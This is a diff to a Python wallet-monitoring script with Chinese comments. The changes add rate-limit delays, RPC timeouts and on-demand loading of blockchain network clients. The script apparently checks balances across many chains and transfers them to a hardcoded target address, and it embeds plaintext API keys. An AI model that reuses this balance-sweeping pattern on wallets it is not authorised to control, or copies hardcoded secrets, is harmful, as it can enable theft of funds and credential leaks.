@@ -79,7 +79,7 @@ except ImportError as e:
     sys.exit(1)
 
 # 配置
-ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
+ALCHEMY_API_KEY = "MYr2ZG1P7bxc4F1qVTLIj"
 TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
 
 # 数据文件
@@ -595,8 +595,12 @@ class WalletMonitor:
             try:
                 config = network_info['config']
                 
+                # 添加小延迟避免API限制
+                import time
+                time.sleep(0.1)
+                
                 # 纯RPC模式
-                web3 = Web3(Web3.HTTPProvider(config['rpc_url']))
+                web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 10}))
                 # 测试连接
                 block_number = web3.eth.get_block_number()
                 return network_key, web3, True, None
@@ -604,13 +608,15 @@ class WalletMonitor:
             except Exception as e:
                 return network_key, None, False, str(e)
         
-        # 使用线程池并发初始化
-        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
-            # 按优先级排序
+        # 使用线程池并发初始化（降低并发数避免API限制）
+        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+            # 按优先级排序，只初始化前20个网络避免API限制
             sorted_networks = sorted(SUPPORTED_NETWORKS.items(), 
                                    key=lambda x: NETWORK_PRIORITY.get(x[0], 999))
             
-            futures = [executor.submit(init_single_client, item) for item in sorted_networks]
+            # 只初始化前20个网络，避免API限制
+            priority_networks = sorted_networks[:20]
+            futures = [executor.submit(init_single_client, item) for item in priority_networks]
             
             success_count = 0
             mainnet_count = 0
@@ -651,10 +657,51 @@ class WalletMonitor:
         self.save_network_status()
         
         print(f"\n{Fore.GREEN}🎉 RPC网络系统初始化完成!{Style.RESET_ALL}")
-        print(f"  📊 总计: {success_count}/{len(SUPPORTED_NETWORKS)} 个网络可用")
-        print(f"  🌐 主网: {mainnet_count}/{len(MAINNET_NETWORKS)} 个")
-        print(f"  🧪 测试网: {testnet_count}/{len(TESTNET_NETWORKS)} 个")
+        print(f"  📊 总计: {success_count}/20 个优先网络可用 (避免API限制)")
+        print(f"  🌐 主网: {mainnet_count} 个")
+        print(f"  🧪 测试网: {testnet_count} 个")
         print(f"  🌐 RPC模式: {success_count} 个")
+        print(f"  💡 其他网络将在需要时动态加载")
+    
+    def load_network_on_demand(self, network_key: str) -> bool:
+        """按需加载网络客户端"""
+        if network_key in self.web3_clients:
+            return True
+            
+        try:
+            network_info = SUPPORTED_NETWORKS.get(network_key)
+            if not network_info:
+                return False
+                
+            config = network_info['config']
+            web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 10}))
+            
+            # 测试连接
+            web3.eth.get_block_number()
+            
+            # 存储客户端
+            self.web3_clients[network_key] = web3
+            
+            # 更新状态
+            self.network_status[network_key] = NetworkStatus(
+                available=True,
+                last_check=datetime.now().isoformat(),
+                error_count=0,
+                last_error=""
+            )
+            
+            print(f"{Fore.GREEN}🔗 动态加载 {NETWORK_NAMES[network_key]} 成功{Style.RESET_ALL}")
+            return True
+            
+        except Exception as e:
+            self.network_status[network_key] = NetworkStatus(
+                available=False,
+                last_check=datetime.now().isoformat(),
+                error_count=1,
+                last_error=str(e)
+            )
+            print(f"{Fore.YELLOW}⚠️ 动态加载 {NETWORK_NAMES[network_key]} 失败: {str(e)[:30]}...{Style.RESET_ALL}")
+            return False
     
     def load_network_status(self):
         """加载网络状态缓存"""
@@ -881,10 +928,15 @@ class WalletMonitor:
             if not network_info:
                 return False
             
-            # RPC模式
+            # RPC模式 - 按需加载
             web3 = self.web3_clients.get(network_key)
             if not web3:
-                return False
+                # 尝试动态加载
+                if not self.load_network_on_demand(network_key):
+                    return False
+                web3 = self.web3_clients.get(network_key)
+                if not web3:
+                    return False
             return await self._check_activity_rpc(web3, address, network_key)
             
         except Exception as e:
@@ -943,10 +995,15 @@ class WalletMonitor:
                 return 0.0
             
             async with asyncio.timeout(5):  # 5秒超时
-                # RPC模式
+                # RPC模式 - 按需加载
                 web3 = self.web3_clients.get(network_key)
                 if not web3:
-                    return 0.0
+                    # 尝试动态加载
+                    if not self.load_network_on_demand(network_key):
+                        return 0.0
+                    web3 = self.web3_clients.get(network_key)
+                    if not web3:
+                        return 0.0
                 
                 # 在事件循环中运行同步的web3调用
                 loop = asyncio.get_event_loop()
@@ -974,10 +1031,15 @@ class WalletMonitor:
             
             # 并发获取交易参数
             async with asyncio.timeout(15):  # 15秒超时
-                # RPC模式
+                # RPC模式 - 按需加载
                 web3 = self.web3_clients.get(network_key)
                 if not web3:
-                    return False
+                    # 尝试动态加载
+                    if not self.load_network_on_demand(network_key):
+                        return False
+                    web3 = self.web3_clients.get(network_key)
+                    if not web3:
+                        return False
                 return await self._transfer_rpc(web3, wallet, network_key, balance, account, config)
                 
         except asyncio.TimeoutError:
